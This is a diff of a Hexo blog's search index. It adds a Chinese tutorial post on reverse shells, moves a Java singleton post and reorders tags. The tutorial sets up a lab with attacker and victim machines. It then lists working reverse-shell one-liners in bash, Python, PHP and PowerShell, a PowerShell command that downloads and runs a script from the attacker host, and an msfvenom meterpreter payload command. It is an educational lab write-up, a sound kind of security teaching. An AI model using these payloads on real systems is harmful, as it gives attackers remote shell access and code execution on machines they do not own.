@@ -3,6 +3,106 @@
   
     
     <entry>
+      <title><![CDATA[反弹Shell]]></title>
+      <url>/2021/01/08/%E5%8F%8D%E5%BC%B9shell/</url>
+      <content type="html"><![CDATA[<h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><code>反弹shell和telnet，ssh等标准shell对应，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</code></p>
+<p>反弹shell也可以理解为反向连接，我们日常所使用的telnet、ssh、远程桌面等服务都是正向连接(即我们主动去连接目标)，反弹shell就是让目标主动连接我们。</p>
+<p><strong>反弹shell好处</strong></p>
+<ul>
+<li>防火墙大多数都是防止外部连接内部，利用反弹shell我们可以让服务器从内部连接外部</li>
+<li>主动连接端口是固定，有可能被占用，反弹shell端口不固定</li>
+<li>反弹shell还有提升权限等好处</li>
+</ul>
+<h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><ul>
+<li><p>受害机centOs7：192.168.65.137</p>
+</li>
+<li><p>攻击机kali2020：192.168.65.148</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>攻击机开启端口监听</span><br><span class="line">nc -lvp 9999</span><br><span class="line"><span class="meta">#</span>nc指的是netcat</span><br><span class="line"><span class="meta">#</span>-l 是listen监听的作用</span><br><span class="line"><span class="meta">#</span>-v 用于输出交互的信息</span><br><span class="line"><span class="meta">#</span>-p 用于监听指定端口</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="img/%E5%8F%8D%E5%BC%B9shell/1609514196672.png" alt="1609514196672" title class>
+                <p>1609514196672</p>
+            </figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>受害机执行反弹命令(自动连接监听的端口)</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br><span class="line"><span class="meta">#</span>bash -i 用于产生一个交互的shell</span><br><span class="line"><span class="meta">#</span>/dev/tcp/ip/port 作用相当于建立一个sockt连接</span><br></pre></td></tr></table></figure>
+
+<figure class="image-box">
+                <img src="img/%E5%8F%8D%E5%BC%B9shell/1609514612069.png" alt="1609514612069" title class>
+                <p>1609514612069</p>
+            </figure>
+
+<figure class="image-box">
+                <img src="img/%E5%8F%8D%E5%BC%B9shell/1609514726946.png" alt="1609514726946" title class>
+                <p>1609514726946</p>
+            </figure>
+
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><blockquote>
+<ul>
+<li><p>&lt;  和  &gt;表示覆盖、&lt;&lt;  和  &gt;&gt;表示追加</p>
+</li>
+<li><p>0 - stdin 代表标准输入,默认是键盘,使用&lt;或&lt;&lt;</p>
+<ul>
+<li>1 - stdout 代表标准输出,默认是显示器,使用&gt;或&gt;&gt;</li>
+<li>2 - stderr 代表标准错误输出,默认是显示器,使用2&gt;或2&gt;&gt;</li>
+</ul>
+</li>
+<li><p>&amp;&gt;和&gt;&amp;作用一样就是混合输出(标准输出1 + 错误输出2)</p>
+<ul>
+<li>当后面接文件时，就会把标准输出和标准错误输出重定向至文件</li>
+<li>当后面接文件描述符时，就会将前面的文件描述符重定向至后面的文件描述符</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>了解上面内容之后我们再回顾前面<code>bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</code>中的<code>&amp;&gt;和0&gt;&amp;1</code>的作用</p>
+<ul>
+<li><p><code>&gt;&amp;</code>就是把标准输出和错误输出都直接重定向到<code>/dev/tcp/192.168.65.148/9999</code>即攻击机</p>
+</li>
+<li><p><code>0&gt;&amp;1</code>就是把输入的内容重定向到1，而前面<code>&gt;&amp;</code>已经把1内容重定向到<code>/dev/tcp/192.168.65.148/9999</code>,所以输入也重定向到攻击机</p>
+</li>
+<li><p>即把受害机输入和输出所有内容都直接由攻击机接管</p>
+</li>
+</ul>
+<h2 id="常用的反弹shell"><a href="#常用的反弹shell" class="headerlink" title="常用的反弹shell"></a>常用的反弹shell</h2><h3 id="Bash"><a href="#Bash" class="headerlink" title="Bash"></a>Bash</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.65.148/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect(( <span class="string">"192.168.65.148"</span>,<span class="number">9999</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p = subprocess.call([ <span class="string">"/bin/bash"</span> , <span class="string">"-i"</span> ])</span><br></pre></td></tr></table></figure>
+
+<h3 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-ObjectSystem.Net.Webclient).DownloadString(<span class="string">'http://192.168.65.148/powercat.ps1'</span>); </span><br><span class="line"><span class="comment">#需要下载powercat设置好以下准备</span></span><br><span class="line">powercat -c ip_addr -p port -e cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("192.168.65.148",9999);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>
+
+<h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.65.148 LPORT=9999 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure>
+
+<h3 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h3><figure class="image-box">
+                <img src="img/%E5%8F%8D%E5%BC%B9shell/1609518776337.png" alt="1609518776337" title class>
+                <p>1609518776337</p>
+            </figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/2549#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549#toc-5</a></p>
+<p><a href="https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/baVYUY1kEL0T8SprCX5N_Q</a></p>
+<p><a href="https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/KbdCqujuOgfdbYsa7d3BLw</a></p>
+<p><a href="https://blog.csdn.net/zhaominpro/article/details/82630528" target="_blank" rel="noopener">https://blog.csdn.net/zhaominpro/article/details/82630528</a></p>
+<p><a href="https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/L5EcXCuohrjejbNV_MjDXw</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 安全 </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> 安全 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[vue基础]]></title>
       <url>/2020/03/26/vue%E5%9F%BA%E7%A1%80/</url>
       <content type="html"><![CDATA[<h1 id="Vue基础"><a href="#Vue基础" class="headerlink" title="Vue基础"></a>Vue基础</h1><p>模板：</p>
@@ -1553,6 +1653,43 @@
     </entry>
     
     <entry>
+      <title><![CDATA[Java单例设计]]></title>
+      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
+      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
+<ul>
+<li>饿汉式</li>
+</ul>
+<blockquote>
+<p>自动加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>懒汉式</li>
+</ul>
+<blockquote>
+<p>第一次使用才加载</p>
+</blockquote>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      
+        <categories>
+            
+            <category> Java </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Java </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Java-IO]]></title>
       <url>/2019/10/05/Java-IO/</url>
       <content type="html"><![CDATA[<h1 id="转换流"><a href="#转换流" class="headerlink" title="转换流"></a>转换流</h1><ul>
@@ -1636,43 +1773,6 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">BufferedWriter</span><span class="params">(Writer out, <span class="keyword">int</span> size)</span></span></span><br></pre></td></tr></table></figure>
 
 <h1 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Scanner</span><span class="params">(InputStream source)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasNext</span><span class="params">()</span></span>;<span class="comment">//判断是否还有数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">next</span><span class="params">()</span></span>;<span class="comment">//取出数据</span></span><br></pre></td></tr></table></figure>
-
-]]></content>
-      
-        <categories>
-            
-            <category> Java </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Java </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[Java单例设计]]></title>
-      <url>/2019/10/05/Java%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1/</url>
-      <content type="html"><![CDATA[<h1 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h1><p><code>通过单例模式的方法创建的类在当前进程中只有一个实例，并且自行实例化向整个系统提供</code></p>
-<ul>
-<li>饿汉式</li>
-</ul>
-<blockquote>
-<p>自动加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton() ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">return</span> INSTANCE ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>懒汉式</li>
-</ul>
-<blockquote>
-<p>第一次使用才加载</p>
-</blockquote>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">static</span> Singleton instance ;</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;	<span class="comment">// 构造方法私有化了</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;<span class="comment">//向外提供静态访问方法</span></span><br><span class="line">		<span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;	<span class="comment">// 第一次使用</span></span><br><span class="line">			instance = <span class="keyword">new</span> Singleton() ; <span class="comment">// 实例化对象</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> instance ;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">JavaDemo</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> </span>&#123;</span><br><span class="line">		Singleton instance = <span class="keyword">null</span> ;	<span class="comment">// 声明对象</span></span><br><span class="line">		instance = Singleton.getInstance();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       
@@ -3558,9 +3658,9 @@ hexo d</code></pre><h1 id="浏览"><a href="#浏览" class="headerlink" title="�
         
         <tags>
             
-            <tag> 博客 </tag>
-            
             <tag> Hexo </tag>
+            
+            <tag> 博客 </tag>
             
         </tags>
         
